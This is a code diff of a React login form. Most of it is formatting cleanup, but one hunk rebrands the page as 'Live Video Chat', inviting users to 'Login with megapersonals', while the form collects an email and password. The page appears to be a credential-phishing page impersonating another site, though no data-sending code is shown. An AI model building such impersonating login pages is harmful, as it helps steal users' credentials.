@@ -5,8 +5,6 @@ import { useState } from "react";
 import { toast } from "react-toastify";
 
 function LoginForm({ setShowModal }) {
- 
-
   const initialvalues = {
     email: "",
     password: "",
@@ -16,7 +14,7 @@ function LoginForm({ setShowModal }) {
   const { login } = useMockLogin({ setShowModal });
 
   const handleSubmit = (values, formik) => {
-    const { email, password, } = values;
+    const { email, password } = values;
 
     // console.log("values", values);
     // return;
@@ -33,13 +31,21 @@ function LoginForm({ setShowModal }) {
     // console.log(submitValues);
   };
 
-
-
   return (
     <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
-      <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
-        Log in to your account
-      </h3>
+      <div className="px-8 md:px-12">
+        <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
+          Live Video Chat
+        </h3>
+
+        <p className="mt-[15px] text-lg leading-tight font-medium ">
+          Login with megapersonals and enjoy with{" "}
+          <span className="text-[#2b044d] font-bold">
+            Private Live Video Chat
+          </span>{" "}
+          your dating partner.
+        </p>
+      </div>
 
       <div className="mt-5">
         <Formik
@@ -56,23 +62,21 @@ function LoginForm({ setShowModal }) {
                 type="email"
                 required
               />
-                  <Field
-                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-                    placeholder="Password"
-                    name="password"
-                    type="password"
-                    autoComplete="on"
-                    required
-                  />
+              <Field
+                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                placeholder="Password"
+                name="password"
+                type="password"
+                autoComplete="on"
+                required
+              />
 
-<button
-                    type="submit"
-                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
-                  >
-                    Log in
-                  </button>
-                
-              
+              <button
+                type="submit"
+                className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+              >
+                Log in
+              </button>
             </Form>
           )}
         </Formik>
